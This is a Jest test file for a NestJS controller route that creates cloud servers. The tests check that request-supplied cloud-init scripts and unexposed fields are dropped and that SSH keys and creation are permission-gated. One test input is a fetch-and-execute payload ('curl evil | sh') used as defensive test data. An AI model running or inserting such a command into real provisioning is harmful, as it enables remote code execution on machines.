jest.mock('@kubernetes/client-node', () => ({}));
jest.mock('ip-cidr', () => ({}));
jest.mock('jwks-rsa', () => ({ JwksClient: jest.fn() }));
jest.mock('jose', () => ({}));
jest.mock('@octokit/rest', () => ({ Octokit: class {} }));
jest.mock('@octokit/auth-app', () => ({ createAppAuth: jest.fn() }));
jest.mock('libsodium-wrappers', () => ({ ready: Promise.resolve() }));

import { ForbiddenException } from '@nestjs/common';
import { ServersController } from './servers.controller';
import { CreateServerDto } from './dto/create-server.dto';
import { IAM_PERMISSION } from '../../iam/constants/iam-permissions';
import { REQUIRED_PERMISSION_KEY } from '../../iam/decorators/require-permission.decorator';
import { MCP_SCOPE } from '../../mcp/constants/mcp-scopes';
import { CloudProvider } from '../../providers/enums/cloud-provider.enum';

/**
 * `POST /infrastructure/servers` is the one route that creates a machine from
 * a request body. What the body may say is what a platform operator — who
 * manages the platform but not the data on it — can make a new machine do.
 */
describe('ServersController.createServer', () => {
  const operator = {
    userId: 'op',
    email: 'op@x',
    roles: {},
    isAdmin: false,
  };

  const build = (withheld: string[] = []) => {
    const createServer = jest.fn(async () => ({
      id: 'op-1',
      status: 'pending',
      createdAt: new Date(0),
    }));
    const check = jest.fn(
      async (_p: unknown, permission: string) => !withheld.includes(permission),
    );
    const controller = new ServersController(
      { createServer } as never,
      { check } as never,
    );
    return { controller, createServer, check };
  };

  const body = (over: Record<string, unknown> = {}): CreateServerDto =>
    Object.assign(new CreateServerDto(), {
      name: 'n1',
      provider: CloudProvider.HETZNER,
      server_type: 'cx22',
      location: 'nbg1',
      ...over,
    });

  it('never hands a cloud-init script from the request to the provider', async () => {
    const { controller, createServer } = build();

    await controller.createServer(
      body({ user_data: '#!/bin/sh\ncurl evil | sh' }),
      { user: operator } as never,
    );

    const passed = (createServer.mock.calls[0] as unknown[])[0] as Record<
      string,
      unknown
    >;
    expect(passed.user_data).toBeUndefined();
  });

  it('drops every field the API does not expose', async () => {
    const { controller, createServer } = build();

    await controller.createServer(
      body({
        labels: [{ key: 'managed-by', value: 'flui' }],
        firewalls: ['fw-1'],
        networks: ['vnet-of-a-tenant'],
        attachedVolumes: [{ sizeGb: 10, name: 'v' }],
        diskSizeGb: 500,
        uuid: 'chosen',
      }),
      { user: operator } as never,
    );

    const passed = (createServer.mock.calls[0] as unknown[])[0] as Record<
      string,
      unknown
    >;
    for (const field of [
      'labels',
      'firewalls',
      'networks',
      'attachedVolumes',
      'diskSizeGb',
      'uuid',
    ]) {
      expect(passed[field]).toBeUndefined();
    }
    expect(passed.name).toBe('n1');
  });

  it('refuses caller SSH keys to a principal without data:access', async () => {
    const { controller, createServer } = build([IAM_PERMISSION.DATA_ACCESS]);

    await expect(
      controller.createServer(body({ ssh_keys: ['mine'] }), {
        user: operator,
      } as never),
    ).rejects.toThrow(ForbiddenException);
    await expect(
      controller.createServer(body({ ssh_keys: ['mine'] }), {
        user: operator,
      } as never),
    ).rejects.toThrow(/data:access/);
    expect(createServer).not.toHaveBeenCalled();
  });

  it('refuses caller SSH keys to a credential whose ceiling lacks data:access', async () => {
    const { controller, createServer, check } = build();

    await expect(
      controller.createServer(body({ ssh_keys: ['mine'] }), {
        user: { ...operator, isAdmin: true, scopes: [MCP_SCOPE.INFRA_READ] },
      } as never),
    ).rejects.toThrow(ForbiddenException);
    expect(check).not.toHaveBeenCalled();
    expect(createServer).not.toHaveBeenCalled();
  });

  it('accepts caller SSH keys from a principal holding data:access', async () => {
    const { controller, createServer } = build();

    await controller.createServer(body({ ssh_keys: ['mine'] }), {
      user: operator,
    } as never);

    const passed = (createServer.mock.calls[0] as unknown[])[0] as Record<
      string,
      unknown
    >;
    expect(passed.ssh_keys).toEqual(['mine']);
  });

  it('asks nothing extra when no key is named', async () => {
    const { controller, createServer, check } = build([
      IAM_PERMISSION.DATA_ACCESS,
    ]);

    await controller.createServer(body(), { user: operator } as never);

    expect(createServer).toHaveBeenCalled();
    expect(check).not.toHaveBeenCalled();
  });

  it('asks cluster:manage, so a read-only credential cannot create a machine', () => {
    expect(
      Reflect.getMetadata(
        REQUIRED_PERMISSION_KEY,
        ServersController.prototype.createServer,
      ),
    ).toBe(IAM_PERMISSION.CLUSTER_MANAGE);
  });
});
